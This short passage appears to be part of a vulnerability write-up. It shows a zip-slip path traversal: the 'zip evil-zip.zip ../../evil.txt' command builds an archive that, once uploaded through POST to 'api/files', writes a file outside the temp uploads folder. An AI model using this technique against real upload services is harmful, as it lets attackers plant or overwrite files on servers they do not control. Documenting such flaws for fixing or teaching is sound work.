## Executing the exploit:
- As all files are stored in /backend/temp/uploads we can create a zip with relative import:
`zip evil-zip.zip ../../evil.txt`
And after uploading the zip through `POST` to url `api/files` we can see the evil.txt file created in the main directory.